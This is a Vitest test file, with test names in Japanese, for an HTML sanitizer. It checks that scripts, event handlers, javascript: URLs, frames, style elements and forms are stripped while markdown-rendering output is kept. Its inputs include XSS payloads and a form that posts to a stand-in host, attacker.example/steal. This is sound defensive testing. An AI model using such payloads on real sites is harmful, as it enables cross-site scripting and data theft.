import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "./sanitize";

describe("sanitizeHtml", () => {
  it("外部取得を隠せるstyle要素を除去する", () => {
    const result = sanitizeHtml(
      "<style>body{background:url(https://example.com/a.png)}</style><p>x</p>"
    );
    expect(result).not.toContain("<style");
    expect(result).toContain("<p>x</p>");
  });

  it("script タグを除去する", () => {
    const result = sanitizeHtml('<p>hello</p><script>alert("xss")</script>');
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("alert");
    expect(result).toContain("<p>hello</p>");
  });

  it("インラインイベントハンドラを除去する", () => {
    const result = sanitizeHtml('<img src="x.png" onerror="alert(1)">');
    expect(result).not.toContain("onerror");
  });

  it("javascript: URLを除去する", () => {
    const result = sanitizeHtml('<a href="javascript:alert(1)">link</a>');
    expect(result).not.toContain("javascript:");
  });

  it("form要素を除去し、内部の通常コンテンツは残す", () => {
    const result = sanitizeHtml(
      '<form action="https://attacker.example/steal" method="post"><p>text</p><button>send</button></form>'
    );
    expect(result).not.toContain("<form");
    expect(result).not.toContain("attacker.example");
    // KEEP_CONTENTにより内部の通常テキストは残る
    expect(result).toContain("text");
  });

  it("iframe / object / embed を除去する", () => {
    const result = sanitizeHtml(
      '<iframe src="https://e.example"></iframe><object data="x"></object><embed src="x">'
    );
    expect(result).not.toContain("<iframe");
    expect(result).not.toContain("<object");
    expect(result).not.toContain("<embed");
  });

  it("onerror 以外のイベントハンドラ（onload / onclick）も除去する", () => {
    const result = sanitizeHtml('<svg onload="alert(1)"></svg><div onclick="alert(1)">x</div>');
    expect(result).not.toContain("onload");
    expect(result).not.toContain("onclick");
  });

  it("data:image/png のインライン画像は保持する（過剰サニタイズしない）", () => {
    const png =
      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAHklEQVR4nO3BAQ0AAADCoPdPbQ43oAAAAAAAAAAAvg0hAAABmmDh1QAAAABJRU5ErkJggg==";
    const result = sanitizeHtml(`<img src="${png}">`);
    expect(result).toContain("data:image/png");
  });

  it("mermaidのプレースホルダーdivをclass・data-code属性ごと保持する", () => {
    const html = '<div class="mermaid-pending" data-code="Zmxvd2NoYXJ0IFREOyBBLS0-Qjs%3D"></div>';
    const result = sanitizeHtml(html);
    expect(result).toContain('class="mermaid-pending"');
    expect(result).toContain('data-code="Zmxvd2NoYXJ0IFREOyBBLS0-Qjs%3D"');
  });

  it("shikiのインラインstyle属性を保持する", () => {
    const html = '<pre class="shiki"><code><span style="color:#RRGGBB">const</span></code></pre>';
    const result = sanitizeHtml(html);
    expect(result).toContain('style="color:#RRGGBB"');
    expect(result).toContain('class="shiki"');
  });

  it("タスクリストのcheckbox inputを保持する", () => {
    const html = '<li class="task-list-item"><input type="checkbox" disabled> done</li>';
    const result = sanitizeHtml(html);
    expect(result).toContain("<input");
    expect(result).toContain('type="checkbox"');
  });

  it("KaTeXのclass・MathML要素・インラインSVGグリフを保持する", () => {
    // katexプラグインの実出力を模したフィクスチャ(\sqrt{2}相当、SVGグリフ含む)
    const html =
      '<span class="katex">' +
      '<span class="katex-mathml"><math><semantics><mrow><msqrt><mn>2</mn></msqrt></mrow></semantics></math></span>' +
      '<span class="katex-html">' +
      '<span class="sqrt"><svg><path d="M95,622 L95,622"></path></svg></span>' +
      "</span>" +
      "</span>";
    const result = sanitizeHtml(html);
    expect(result).toContain('class="katex"');
    expect(result).toContain("<math");
    expect(result).toContain("<msqrt>");
    expect(result).toContain("<svg");
    expect(result).toContain("<path");
  });
});
